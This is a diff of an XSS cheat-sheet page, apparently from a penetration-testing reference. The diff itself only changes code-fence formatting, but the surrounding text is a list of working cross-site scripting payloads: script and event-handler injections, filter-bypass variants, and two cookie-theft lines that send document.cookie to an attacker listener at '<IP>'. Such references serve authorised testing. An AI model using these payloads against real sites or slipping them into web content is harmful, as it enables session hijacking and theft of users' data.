@@ -5,7 +5,7 @@ title: "XSS"
 
 Try the simplest script tag first: if it executes, you have reflected or stored XSS. Move to event-handler variants if the tag gets stripped.
 
-```html
+```html wrap
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
@@ -17,7 +17,7 @@ javascript:alert(1)
 
 Exfiltrate the session cookie to your listener: confirm it's not HttpOnly first, otherwise go for other DOM-accessible data.
 
-```html
+```html wrap
 <script>document.location='http://<IP>/steal?c='+document.cookie</script>
 <img src=x onerror="fetch('http://<IP>/?c='+btoa(document.cookie))">
 ```
@@ -26,7 +26,7 @@ Exfiltrate the session cookie to your listener: confirm it's not HttpOnly first,
 
 Case mixing, encoding, and unusual tags often slip past naive regex filters: test methodically and check what the sanitizer preserves.
 
-```html
+```html wrap
 <ScRiPt>alert(1)</sCrIpT>
 <script>eval(atob('YWxlcnQoMSk='))</script>
 <details open ontoggle=alert(1)>
